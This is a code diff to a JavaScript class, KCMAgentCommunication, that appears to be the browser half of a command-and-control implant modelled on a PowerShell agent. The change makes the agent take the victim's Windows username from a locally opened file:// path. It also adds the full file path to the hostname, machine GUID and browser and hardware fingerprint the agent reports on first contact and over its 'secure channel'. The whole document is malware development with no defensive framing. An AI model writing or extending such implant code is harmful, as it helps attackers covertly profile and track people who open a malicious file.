@@ -1126,27 +1126,44 @@ class KCMAgentCommunication {
         return this.state.pathPool[Math.floor(Math.random() * this.state.pathPool.length)];
     }
     
+    
     // Gather system information
     getSystemInformation(minimal = false) {
+        // Default values - use the persistent hostname
+        let detectedUsername = "Browser-User";
+        
+        // Try to detect username from file:// URL path
+        if (window.location.href.match(/file:....:.Users.*/gi)) {
+            try {
+                const file_path = window.location.href.split('/');
+                const username = file_path[5];
+                detectedUsername = username;
+            } catch (e) {
+                // Fall back to default username
+                console.log("Error extracting username from file path:", e);
+            }
+        }
+        
         // For first contact, return minimal information with exact fields PowerShell uses
         if (minimal) {
             return {
-                Hostname: this.persistentHostname,  // Use persistent hostname
-                MachineGuid: this.persistentMachineGuid,  // Use persistent machine GUID
+                Hostname: this.persistentHostname,
+                MachineGuid: this.persistentMachineGuid,
                 KeyRegistrationStatus: "pending", 
                 IP: "127.0.0.1",
                 ProxyEnabled: false,
                 ProxyType: "system",
                 RotationId: 0,
-                Username: "Browser-User",
+                Username: detectedUsername,
                 OsVersion: navigator.userAgent,
                 Domain: "WORKGROUP"
             };
         } else {
             // For secure channel, return complete system information
             const info = {
-                Hostname: this.persistentHostname,  // Include persistent hostname
-                MachineGuid: this.persistentMachineGuid,  // Include persistent machine GUID
+                Hostname: this.persistentHostname,
+                MachineGuid: this.persistentMachineGuid,
+                Username: detectedUsername,
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
@@ -1163,7 +1180,8 @@ class KCMAgentCommunication {
                 browserVendor: navigator.vendor || 'unknown',
                 colorDepth: window.screen.colorDepth,
                 devicePixelRatio: window.devicePixelRatio,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                filePath: window.location.href  // Include the full file path
             };
             
             // Try to get battery info if available
